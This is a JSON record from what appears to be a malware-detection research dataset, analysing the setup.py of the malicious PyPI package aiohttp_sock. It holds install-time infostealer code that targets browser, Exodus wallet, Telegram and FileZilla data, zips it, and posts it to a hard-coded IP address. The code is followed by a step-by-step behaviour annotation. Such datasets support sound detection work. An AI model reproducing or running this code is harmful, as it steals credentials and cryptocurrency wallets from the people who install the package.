{
  "metadata": {
    "package_name": "aiohttp_sock-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/aiohttp_sock-0.1.19.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.19/aiohttp_sock-0.1.19/setup.py",
      "code_snippets": [
        {
          "snippet": "import subprocess\nimport sys\nimport contextlib as __stickytape_contextlib\nimport asyncio\nfrom asyncio import create_task\nfrom typing import List\nfrom weakref import proxy\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData\nimport secrets\nimport timeit\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom base64 import b64encode\nfrom tools import zipdir, _handle_task_result\nfrom logger import Logger\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    \n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n            make_package(os.path.dirname(path))\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n        # ... (hundreds of lines omitted for brevity, see original for full context)\n        # The __stickytape_write_module calls write out a large number of modules, including code to steal browser passwords, cookies, wallets, and exfiltrate them.\n        # After writing modules, the following code is executed:\n        HOST = 'http://144.24.115.170'\n        async def main() -> None:\n            start = timeit.default_timer()\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n            print(log_path)\n            mkdir(log_path)\n            tasks: List[asyncio.Task] = []\n            session = Session()\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n            await logger.log(f'Start')\n            chromium = Chromium(conf)\n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n            other_plugins = [Details(conf)]\n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n            with MultipartWriter() as writer:\n                writer.append(open(zip_log_path, 'rb'))\n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=writer)\n            await session.close()\n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        asyncio.run(main())\n",
          "triple_sequences": [
            {
              "action_api": "subprocess.call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f'{sys.executable} -m pip install aiofiles'",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f'{sys.executable} -m pip install aiohttp'",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f'{sys.executable} -m pip install cryptography'",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f'{sys.executable} -m pip install aiosqlite'",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "tempfile.mkdtemp()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create temporary directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "dir_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "partial_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "partial_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "os.path.join(partial_path, \"__init__.py\")",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "full_path",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "sys.path.insert()",
              "action_description": "Path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "__stickytape_working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "TEMP, client_id",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "log_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "Logger()",
              "action_description": "Instantiates custom Logger class",
              "action_id": "init_logger_class",
              "object": "log_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "Config()",
              "action_description": "Instantiates Config class",
              "action_id": "init_config_class",
              "object": "client_id, HOST, log_path, logger, session",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "logger.log()",
              "action_description": "Writes log entry",
              "action_id": "write_log_entry",
              "object": "f'Start'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "Chromium()",
              "action_description": "Instantiates Chromium class",
              "action_id": "init_browser_class",
              "object": "conf",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Collect browser information",
              "intention_id": "collect_browser_info"
            },
            {
              "action_api": "Exodus()",
              "action_description": "Instantiates Exodus class",
              "action_id": "init_exodus_class",
              "object": "conf",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Collect browser information",
              "intention_id": "collect_browser_info"
            },
            {
              "action_api": "Telegram()",
              "action_description": "Instantiates Telegram class",
              "action_id": "init_telegram_class",
              "object": "conf",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Collect browser information",
              "intention_id": "collect_browser_info"
            },
            {
              "action_api": "Filezilla()",
              "action_description": "Instantiates Filezilla class",
              "action_id": "init_filezilla_class",
              "object": "conf",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Collect browser information",
              "intention_id": "collect_browser_info"
            },
            {
              "action_api": "create_task()",
              "action_description": "Creates asynchronous task",
              "action_id": "create_async_task",
              "object": "search_plugin_paths(root_paths, search_folder_names)",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "create_task()",
              "action_description": "Creates asynchronous task",
              "action_id": "create_async_task",
              "object": "plugin.callback()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "task.add_done_callback()",
              "action_description": "Adds callback to asynchronous task",
              "action_id": "add_async_callback",
              "object": "_handle_task_result",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "await task",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "task",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "logger.log()",
              "action_description": "Writes log entry",
              "action_id": "write_log_entry",
              "object": "f'Error in main.py tasks {e}'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "logger.log()",
              "action_description": "Writes log entry",
              "action_id": "write_log_entry",
              "object": "f'═рўшэр■ юЄяЁртъє ыюур'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "TEMP, f'{client_id}.zip'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "zip_log_path, 'w', ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "zipdir()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "log_path, zipf",
              "object_description": "Directory path and ZIP archive file",
              "object_id": "directory_path_with_file",
              "intention_description": "Add file to archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "MultipartWriter()",
              "action_description": "Creates multipart writer for HTTP requests",
              "action_id": "create_multipart_writer",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "writer.append()",
              "action_description": "Adds field to multipart HTTP request",
              "action_id": "add_multipart_field",
              "object": "open(zip_log_path, 'rb')",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "session.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f'{HOST}/receive_log', params={'client_id': client_id}, data=writer",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "session.close()",
              "action_description": "Closes the HTTP response object",
              "action_id": "close_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release connection resource",
              "intention_id": "release_connection_resource"
            },
            {
              "action_api": "logger.log()",
              "action_description": "Writes log entry",
              "action_id": "write_log_entry",
              "object": "f'Time: {stop-start}'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "main()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}